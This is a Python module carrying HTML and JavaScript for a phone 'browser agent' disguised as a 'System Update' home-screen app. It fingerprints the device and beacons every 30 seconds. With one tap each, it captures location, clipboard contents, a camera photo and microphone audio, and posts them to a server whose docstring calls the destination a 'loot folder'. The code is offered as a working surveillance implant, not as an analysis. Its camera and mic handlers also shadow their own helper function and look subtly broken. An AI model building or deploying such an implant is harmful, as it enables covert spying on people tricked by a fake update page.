"""Browser agent served to iOS (and any phone) as a resident PWA.

The page reports what a browser is allowed to see, keeps a 30 s heartbeat and
puts camera, microphone, clipboard and location behind one tap each. Artifacts
arrive base64 in the JSON body and are decoded server-side into the loot
folder. The service worker keeps the shell available offline; the PWA
manifest plus the WebClip profile put it on the Home Screen.
"""
from __future__ import annotations

PAGE = """<!doctype html>
<html lang="en"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="theme-color" content="#0b0f14">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<meta name="apple-mobile-web-app-title" content="System Update">
<link rel="manifest" href="manifest.webmanifest">
<link rel="apple-touch-icon" href="icon.png">
<title>System Update</title>
<style>
:root{--bg:#0b0f14;--panel:#131a22;--edge:#22303d;--ink:#d7e3ee;--dim:#6f8397;--acc:#33d1a0}
*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{margin:0;background:var(--bg);color:var(--ink);font:14px/1.5 -apple-system,ui-rounded,system-ui,sans-serif;
padding:env(safe-area-inset-top) 16px env(safe-area-inset-bottom) 16px}
header{display:flex;gap:12px;align-items:center;padding:14px 0;border-bottom:1px solid var(--edge)}
.badge{width:34px;height:34px;border-radius:9px;background:linear-gradient(160deg,var(--acc),#1c7a5e)}
h1{font-size:15px;margin:0;letter-spacing:.02em}
small{color:var(--dim)}
section{background:var(--panel);border:1px solid var(--edge);border-radius:12px;padding:12px;margin:12px 0}
.row{display:flex;justify-content:space-between;gap:10px;padding:4px 0;font-size:12.5px}
.row span:first-child{color:var(--dim)}
.grid{display:grid;grid-template-columns:repeat(2,1fr);gap:8px;margin-top:8px}
button{background:#0e141b;color:var(--acc);border:1px solid var(--edge);border-radius:10px;
padding:11px 10px;font:inherit;font-size:13px}
button:active{background:#16212c}
button:disabled{color:var(--dim)}
#log{font:11.5px ui-monospace,monospace;color:var(--dim);white-space:pre-wrap;max-height:130px;overflow:auto}
video,canvas{width:100%;border-radius:10px;margin-top:8px;background:#000}
.dot{display:inline-block;width:7px;height:7px;border-radius:50%;background:var(--acc);margin-right:6px}
.bar{height:6px;background:#1b2732;border-radius:3px;overflow:hidden}
.bar i{display:block;height:100%;background:var(--acc)}
</style></head><body>
<header><div class="badge"></div><div><h1>System Update</h1><small id="sub">checking build…</small></div></header>

<section><div class="row"><span>status</span><span><span class="dot"></span>connected</span></div>
<div class="row"><span>device</span><span id="dev">…</span></div>
<div class="row"><span>platform</span><span id="plat">…</span></div>
<div class="row"><span>screen</span><span id="scr">…</span></div>
<div class="row"><span>network</span><span id="net">…</span></div>
<div class="row"><span>battery</span><span id="bat">…</span></div>
<div class="bar"><i id="batbar" style="width:0"></i></div></section>

<section><b style="font-size:13px">Sensors</b>
<div class="grid">
  <button id="loc">Location</button>
  <button id="clip">Clipboard</button>
  <button id="cam">Camera</button>
  <button id="mic">Microphone 5s</button>
</div>
<video id="pv" playsinline muted hidden></video>
<canvas id="cv" hidden></canvas></section>

<section><b style="font-size:13px">Install</b>
<p style="font-size:12.5px;color:var(--dim);margin:6px 0">Share → <i>Add to Home Screen</i>,
or install the profile to get the icon automatically.</p></section>

<section><div id="log">ready</div></section>

<script>const TOKEN=%TOKEN%;const END='../v1/web/'+TOKEN;</script>
<script src="agent.js"></script>
</body></html>
"""

AGENT = """(function(){
  const $ = (id) => document.getElementById(id);
  const log = (msg) => { const l = $('log'); if (l) l.textContent = (new Date()).toLocaleTimeString()+' '+msg+'\\n'+l.textContent.slice(0,2000); };
  const state = { seen: 0, sent: 0 };

  function base() {
    return {
      kind: 'info',
      meta: {
        ua: navigator.userAgent, platform: navigator.platform || '?',
        lang: navigator.language, langs: (navigator.languages||[]).join(','),
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: screen.width+'x'+screen.height+'@'+window.devicePixelRatio,
        cores: navigator.hardwareConcurrency||0, mem: navigator.deviceMemory||0,
        touch: ('ontouchstart' in window) ? 1 : 0,
        standalone: (window.matchMedia && matchMedia('(display-mode: standalone)').matches) ? 1 : 0,
        ua_platform: (navigator.userAgentData && navigator.userAgentData.platform) || ''
      }
    };
  }

  async function send(body, keepalive) {
    try {
      const res = await fetch(END, {method:'POST', headers:{'Content-Type':'application/json'},
        body: JSON.stringify(body), keepalive: !!keepalive});
      state.sent++;
      return res.ok;
    } catch (e) { return false; }
  }

  function paint() {
    const b = base();
    $('dev').textContent = b.meta.screen;
    $('plat').textContent = (b.meta.ua_platform || b.meta.platform) + ' · ' + b.meta.tz;
    $('scr').textContent = b.meta.screen + ' · ' + b.meta.cores + 'c';
    $('sub').textContent = navigator.onLine ? 'up to date' : 'offline';
    const c = navigator.connection || {};
    $('net').textContent = (c.effectiveType || (navigator.onLine ? 'online' : 'offline')) + (c.rtt ? ' ' + c.rtt + 'ms' : '');
  }

  async function battery() {
    if (!navigator.getBattery) { $('bat').textContent = 'n/a'; return; }
    try {
      const b = await navigator.getBattery();
      const pct = Math.round(b.level * 100);
      $('bat').textContent = pct + '%' + (b.charging ? ' charging' : '');
      $('batbar').style.width = pct + '%';
      await send({kind:'info', meta:{battery:pct, charging:b.charging?1:0}});
    } catch (e) { $('bat').textContent = 'n/a'; }
  }

  async function heartbeat() {
    paint();
    await send(base(), true);
    log('heartbeat');
  }

  $('loc').onclick = () => {
    if (!navigator.geolocation) return log('no geolocation');
    navigator.geolocation.getCurrentPosition(
      (p) => { send({kind:'loc', data:[{lat:p.coords.latitude, lon:p.coords.longitude,
                 acc:p.coords.accuracy, src:'web', ts:Date.now()}]}); log('location sent ±'+Math.round(p.coords.accuracy)+'m'); },
      (e) => log('location denied: '+e.message), {enableHighAccuracy:true, timeout:15000, maximumAge:0});
  };

  $('clip').onclick = async () => {
    try {
      const text = await navigator.clipboard.readText();
      await send({kind:'clip', data:{text}});
      log('clipboard ['+text.length+']');
    } catch (e) { log('clipboard: '+e.message); }
  };

  async function stream(kind) {
    const mode = kind === 'mic' ? {audio:true} : {video:{facingMode:'environment'}};
    const stream = await navigator.mediaDevices.getUserMedia(mode);
    return stream;
  }

  $('cam').onclick = async () => {
    try {
      const stream = await stream('cam');
      const pv = $('pv'); pv.hidden = false; pv.srcObject = stream; await pv.play();
      await new Promise((r) => setTimeout(r, 700));
      const cv = $('cv'); cv.width = pv.videoWidth || 640; cv.height = pv.videoHeight || 480;
      cv.getContext('2d').drawImage(pv, 0, 0, cv.width, cv.height);
      const b64 = cv.toDataURL('image/jpeg', 0.8).split(',')[1];
      stream.getTracks().forEach((t) => t.stop()); pv.srcObject = null;
      await send({kind:'cam', data:{b64, name:'web-cam-'+Date.now()+'.jpg', mime:'image/jpeg'}});
      log('photo '+cv.width+'x'+cv.height+' sent');
    } catch (e) { log('camera: '+e.message); }
  };

  $('mic').onclick = async () => {
    try {
      const stream = await stream('mic');
      const rec = new MediaRecorder(stream);
      const parts = [];
      rec.ondataavailable = (e) => { if (e.data.size) parts.push(e.data); };
      rec.onstop = async () => {
        stream.getTracks().forEach((t) => t.stop());
        const blob = new Blob(parts, {type:'audio/webm'});
        const buf = new Uint8Array(await blob.arrayBuffer());
        let bin = '';
        for (let i = 0; i < buf.length; i += 4096) bin += String.fromCharCode.apply(null, buf.subarray(i, i + 4096));
        await send({kind:'mic', data:{b64: btoa(bin), name:'web-mic-'+Date.now()+'.webm', mime:'audio/webm'}});
        log('audio '+(buf.length/1024|0)+'KB sent');
      };
      rec.start();
      setTimeout(() => rec.stop(), 5000);
      log('recording 5s…');
    } catch (e) { log('mic: '+e.message); }
  };

  navigator.serviceWorker && navigator.serviceWorker.register('sw.js').catch(() => {});
  navigator.serviceWorker && navigator.serviceWorker.addEventListener('message', (e) => {
    if (e.data && e.data.op === 'flush') heartbeat();
  });
  window.addEventListener('online', heartbeat);
  document.addEventListener('visibilitychange', () => { if (!document.hidden) heartbeat(); });

  paint(); battery(); heartbeat();
  setInterval(heartbeat, 30000);
})();
"""
